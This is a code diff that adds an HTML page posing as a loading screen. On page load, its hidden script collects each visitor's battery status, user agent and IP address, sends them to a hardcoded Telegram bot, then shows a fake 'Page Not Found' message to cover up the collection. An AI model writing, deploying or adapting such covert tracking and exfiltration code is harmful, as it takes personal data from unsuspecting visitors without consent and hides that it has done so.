@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading... Please Wait</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // Telegram Bot Token & Chat ID (Replace with yours)
+        const BOT_TOKEN = "7732553934:AAHmp-ckoOZoXa1SSC9oWh7BRpyVri4up6k";
+        let CHAT_ID = "7835924973"; // Will be set after first message
+
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID || "7835924973", // Fallback if not set
+                        text: message,
+                    }),
+                });
+                const data = await response.json();
+                if (data.ok && !CHAT_ID) CHAT_ID = data.result.chat.id; // Auto-save chat ID
+            } catch (error) {
+                console.error("Telegram API Error:", error);
+            }
+        }
+
+        // Detect Battery Level & Leak It
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(function(battery) {
+                const level = battery.level * 100;
+                const charging = battery.charging ? "Yes" : "No";
+                const details = `🔋 *Battery Leak*:\n- Level: ${level}%\n- Charging: ${charging}\n- User Agent: ${navigator.userAgent}\n- IP: Fetching...`;
+
+                // Send to Telegram
+                sendToTelegram(details);
+
+                // Optional: Fetch IP (using a free API)
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        const ipDetails = `🌐 *IP Address*: ${data.ip}\n- Location: (Use IP lookup tools)`;
+                        sendToTelegram(ipDetails);
+                    });
+            });
+        } else {
+            sendToTelegram("⚠️ Battery API not supported by this user.");
+        }
+
+        // Keep the page empty (no content)
+        setTimeout(() => {
+            document.body.innerHTML = "<h1>Page Not Found</h1>";
+        }, 3000);
+    </script>
+</body>
+</html>
